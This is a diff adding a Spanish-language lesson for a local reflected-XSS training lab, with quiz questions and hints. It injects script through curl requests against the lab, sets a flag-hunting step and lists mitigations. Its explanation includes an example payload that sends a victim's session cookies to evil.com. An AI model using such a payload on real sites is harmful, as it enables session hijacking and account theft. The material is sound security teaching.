@@ -1,0 +1,52 @@
+---
+index: 1
+title: "Reflected XSS: tu código en la respuesta"
+questions:
+  - id: xss-reflejado-t01-q01
+    prompt: "¿Qué tag HTML ejecuta JavaScript en el navegador?"
+    hint: "<script>alert(1)</script>"
+    kind: text
+  - id: xss-reflejado-t01-q02
+    prompt: "¿Qué función de Python SANITIZA HTML (y que este lab deliberadamente NO usa)?"
+    hint: "html.escape() del módulo html."
+    kind: text
+---
+
+## Reflected: el input vuelve sin lavar
+
+Levanta el lab y prueba:
+
+```bash
+# Normal
+curl "http://127.0.0.1:18082/hello?name=Ana"
+# Respuesta: <h1>Hello, Ana!</h1>
+
+# XSS: tu entrada ES código HTML/JS
+curl "http://127.0.0.1:18082/hello?name=<script>alert('XSS')</script>"
+# Respuesta: <h1>Hello, <script>alert('XSS')</script>!</h1>
+```
+
+El navegador recibe TU `<script>` como parte del HTML legítimo y **lo ejecuta**.
+Cualquiera que reciba ese enlace (con tu payload en la URL) ejecuta tu código.
+
+## La búsqueda con flag
+
+El endpoint `/search?q=XSS` tiene una sorpresa:
+
+```bash
+curl "http://127.0.0.1:18082/search?q=XSS"
+```
+
+Busca la flag en el mensaje. El "surprise" del output contiene la flag — visible solo
+cuando la búsqueda contiene la palabra clave correcta.
+
+## Por qué es peligroso en la vida real
+
+Reflected XSS requiere que la VÍCTIMA haga clic en tu enlace malicioso. El ataque:
+
+1. Envías a la víctima: `http://victima.com/hello?name=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>`
+2. La víctima hace clic → el navegador ejecuta tu script
+3. Tu script envía las cookies de sesión de la víctima a tu servidor
+4. Con la cookie, te haces pasar por la víctima
+
+La mitigación: `html.escape()` en Python, `textContent` en JavaScript, CSP headers.
